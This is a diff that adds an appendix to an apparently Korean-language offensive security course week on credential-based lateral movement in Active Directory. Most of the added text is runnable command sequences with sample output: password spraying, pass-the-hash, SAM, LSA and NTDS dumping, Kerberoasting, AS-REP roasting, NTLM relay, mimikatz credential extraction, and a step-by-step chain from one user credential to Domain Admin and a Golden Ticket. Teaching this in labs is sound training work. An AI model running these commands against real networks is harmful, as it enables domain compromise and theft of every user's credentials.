@@ -1314,3 +1314,260 @@ graph LR
 
 **학생 액션**: lab pass-the-hash 시도 → 4624 추적.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 04 측면이동 (자격증명))
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | impacket suite | impacket-secretsdump / wmiexec / smbexec / psexec |
+| s2 | NetExec (modern CME) | nxc smb / winrm |
+| s3 | evil-winrm | evil-winrm |
+| s4 | kerbrute (AD enum) | kerbrute |
+| s5 | BloodHound | bloodhound-python + neo4j |
+| s6 | mimikatz / pypykatz | pypykatz / mimikatz (Win) |
+| s7 | Pass-the-Hash (PtH) | impacket / nxc |
+| s8 | Pass-the-Ticket (PtT) | impacket-getTGT / Rubeus |
+
+### 학생 환경 준비
+
+```bash
+# Impacket suite (가장 표준)
+pip install impacket
+# 자동 설치되는 명령:
+# impacket-secretsdump
+# impacket-psexec / wmiexec / smbexec / atexec
+# impacket-GetUserSPNs / GetNPUsers
+# impacket-getTGT / getST / getPac
+# impacket-ntlmrelayx / smbserver / smbrelayx
+# impacket-rpcdump / lookupsid / samrdump
+# impacket-mssqlclient / addcomputer
+
+# NetExec (modern CrackMapExec 후속)
+pipx install git+https://github.com/Pennyw0rth/NetExec
+nxc --help                                                # 사용법
+
+# Evil-WinRM
+sudo gem install evil-winrm
+
+# Kerbrute (AD 사용자 enum)
+go install github.com/ropnop/kerbrute@latest
+
+# BloodHound + neo4j
+sudo apt install -y neo4j bloodhound bloodhound.py
+sudo systemctl start neo4j
+# Neo4j: http://localhost:7474
+
+# Pypykatz (Win mimikatz 의 Python 포트)
+pip install pypykatz
+```
+
+### NetExec (NXC) — modern multi-protocol
+
+```bash
+# === 1. SMB enum (network-wide) ===
+nxc smb 10.0.0.0/24                                       # 모든 host 의 SMB 정보
+# 출력:
+# SMB         10.0.0.5   445   DC01     [*] Windows Server 2019
+# SMB         10.0.0.10  445   FILESRV  [*] Windows Server 2016
+# SMB         10.0.0.15  445   WORKSTATION [*] Windows 10
+
+# === 2. 자격증명 spray ===
+nxc smb 10.0.0.0/24 -u admin -p 'Pa$$w0rd'                # 단일 자격증명
+nxc smb 10.0.0.0/24 -u admin -p 'Pa$$w0rd' --continue-on-success
+
+# Username 리스트 spray
+nxc smb 10.0.0.5 -u users.txt -p 'Spring2026!'
+
+# Password spray (1 user × N password)
+nxc smb 10.0.0.5 -u admin -p passwords.txt
+
+# === 3. Pass-the-Hash (PtH) ===
+nxc smb 10.0.0.5 -u admin -H "abc123def456..."           # NTLM hash
+nxc winrm 10.0.0.5 -u admin -H "abc123..."
+
+# === 4. 명령 실행 ===
+nxc smb 10.0.0.5 -u admin -H "abc..." -x "whoami"         # SMB exec
+nxc smb 10.0.0.5 -u admin -H "abc..." -X "Get-Process"    # PowerShell
+
+# === 5. SAM dump (자격증명 추출) ===
+nxc smb 10.0.0.5 -u admin -H "abc..." --sam
+# 출력:
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:...
+# user1:1000:...
+
+# === 6. LSA dump (캐시된 자격증명) ===
+nxc smb 10.0.0.5 -u admin -H "abc..." --lsa
+
+# === 7. NTDS.dit dump (DC 만 — 모든 AD 사용자 hash) ===
+nxc smb DC01 -u admin -H "abc..." --ntds
+
+# === 8. Module 사용 ===
+nxc smb 10.0.0.0/24 -u admin -H "abc..." -M wcc
+nxc smb 10.0.0.0/24 -u admin -H "abc..." -M shares
+
+# === 9. Spider shares (민감 파일 검색) ===
+nxc smb 10.0.0.5 -u admin -H "abc..." -M spider_plus \
+    -o EXTENSIONS=txt,docx,xlsx PATTERNS='password,credential,secret'
+```
+
+### Impacket Suite (가장 표준)
+
+```bash
+# === 1. SecretsDump (NTDS / SAM / LSA dump) ===
+# Local
+impacket-secretsdump 'admin:Pa$$w0rd@10.0.0.5'
+
+# DC (NTDS — 모든 AD 사용자)
+impacket-secretsdump -just-dc-ntlm 'admin:Pa$$w0rd@DC01'
+impacket-secretsdump -just-dc 'admin:Pa$$w0rd@DC01' \
+    -ntds /tmp/ntds.dit -system /tmp/SYSTEM
+
+# === 2. PsExec (원격 명령 실행) ===
+impacket-psexec 'admin:Pa$$w0rd@10.0.0.5'                 # interactive shell
+
+# === 3. WmiExec (PsExec 보다 stealthy) ===
+impacket-wmiexec 'admin:Pa$$w0rd@10.0.0.5'
+
+# === 4. SmbExec (Win Service 사용) ===
+impacket-smbexec 'admin:Pa$$w0rd@10.0.0.5'
+
+# === 5. AtExec (Scheduled Task 으로) ===
+impacket-atexec 'admin:Pa$$w0rd@10.0.0.5' "whoami"
+
+# === 6. Pass-the-Hash ===
+impacket-psexec -hashes :NTHASH 'admin@10.0.0.5'
+impacket-wmiexec -hashes :NTHASH 'admin@10.0.0.5'
+
+# === 7. Kerberoasting ===
+impacket-GetUserSPNs corp.local/user:'Pa$$w0rd' -dc-ip 10.0.0.1 -request
+
+# 출력:
+# $krb5tgs$23$*service$realm$user*$abc123...
+# 이 hash 를 hashcat 으로 크랙 (course11 week04)
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# === 8. AS-REP Roasting (kerbrute 와 함께) ===
+impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.1 -no-pass -usersfile users.txt
+# 출력:
+# $krb5asrep$23$user@REALM:abc123...
+# Hashcat -m 18200 으로 크랙
+
+# === 9. Pass-the-Ticket (PtT) ===
+# 1) TGT 획득
+impacket-getTGT 'corp.local/user:Pa$$w0rd' -dc-ip 10.0.0.1
+# user.ccache 파일 생성
+
+# 2) Ticket 사용
+export KRB5CCNAME=user.ccache
+impacket-psexec -k -no-pass corp.local/user@DC01
+
+# === 10. NTLM Relay (위치 기반 공격) ===
+# Listener
+impacket-ntlmrelayx -smb2support -t smb://10.0.0.5
+
+# 다른 host 가 listener 로 인증 시도 → 자동 relay → target 침투
+```
+
+### BloodHound (AD path 매핑)
+
+```bash
+# === 1. 데이터 수집 (bloodhound-python) ===
+bloodhound-python -d corp.local \
+    -u user -p 'Pa$$w0rd' \
+    -ns 10.0.0.1 \
+    -c All \
+    --zip                                                  # 모든 데이터 → zip
+
+# 또는 SharpHound (Win 환경 — .NET)
+# https://github.com/BloodHoundAD/SharpHound
+
+# === 2. Neo4j 시작 ===
+sudo systemctl start neo4j
+# http://localhost:7474 (neo4j/neo4j → 새 비번)
+
+# === 3. BloodHound GUI 시작 ===
+bloodhound &                                              # Web UI
+# 또는 BloodHound CE (community edition):
+docker compose up -d                                      # bloodhound-ce
+
+# === 4. 데이터 import ===
+# GUI 에서 zip 파일 업로드 또는:
+neo4j-admin import --database=neo4j /tmp/bloodhound-data/
+
+# === 5. Pre-built queries (Web UI) ===
+# - "Find Shortest Path to Domain Admin"
+# - "Find all Kerberoastable users"
+# - "Find Computers with Unconstrained Delegation"
+# - "Find AS-REP Roastable users"
+# - "Find DCSync rights"
+
+# === 6. Custom Cypher query ===
+# Web UI 의 Raw Query:
+MATCH p=shortestPath((u:User {name:"USER@CORP.LOCAL"})-[*1..]->(c:Computer {name:"DC01.CORP.LOCAL"}))
+RETURN p
+
+# === 7. Outdated edges fix (BloodHound CE 필요) ===
+bloodhound-cli analyze --refresh
+```
+
+### Pypykatz (Linux 에서 mimikatz 기능)
+
+```bash
+# === 1. SAM/SYSTEM dump 분석 ===
+# nxc 또는 reg.exe 으로 SAM/SYSTEM dump 가져온 후
+pypykatz registry --sam SAM --system SYSTEM
+
+# 출력:
+# == SAM ==
+# Administrator
+#   NT: 31d6cfe0d16ae931b73c59d7e0c089c0
+#   LM: aad3b435b51404eeaad3b435b51404ee
+# Guest
+#   ...
+
+# === 2. LSASS minidump 분석 ===
+pypykatz lsa minidump /tmp/lsass.dmp
+
+# === 3. Mimikatz live (Windows 에서)
+# privilege::debug
+# sekurlsa::logonpasswords
+```
+
+### 다단계 lateral 시나리오
+
+```bash
+# === 시나리오: 단일 자격증명 → Domain Admin ===
+
+# Phase 1: Initial host 침투 (어떤 방법이든)
+# user 자격증명 획득
+
+# Phase 2: BloodHound 으로 path 발견
+bloodhound-python -d corp.local -u user -p 'pass' -ns 10.0.0.1 -c All --zip
+# → BloodHound: "Shortest path to Domain Admin"
+# Path: USER → COMPUTER1 (HasSession) → user2 (LocalAdmin) → DC01
+
+# Phase 3: Lateral to COMPUTER1 (PsExec)
+impacket-psexec 'corp.local/user:pass@10.0.0.10'
+
+# Phase 4: COMPUTER1 에서 SAM/LSA dump
+impacket-secretsdump 'corp.local/user:pass@10.0.0.10' -local
+
+# 발견: user2 의 NTLM hash
+
+# Phase 5: PtH 으로 user2 권한 승계
+nxc smb 10.0.0.10 -u user2 -H 'NTLM_HASH'
+
+# Phase 6: user2 가 Domain Admin 이면 → DC 침투
+impacket-secretsdump -just-dc 'user2:hash@DC01' -ntds /tmp/ntds.dit
+# 모든 AD 사용자 hash 추출!
+
+# Phase 7: Golden Ticket 으로 영구 access
+impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain corp.local administrator
+```
+
+학생은 본 4주차에서 **NetExec + Impacket suite + BloodHound + pypykatz + kerbrute** 5 도구로 자격증명 기반 lateral movement 의 advanced 공격 chain (PtH / PtT / Kerberoasting / DCSync / Golden Ticket) 을 OSS 만으로 익힌다.
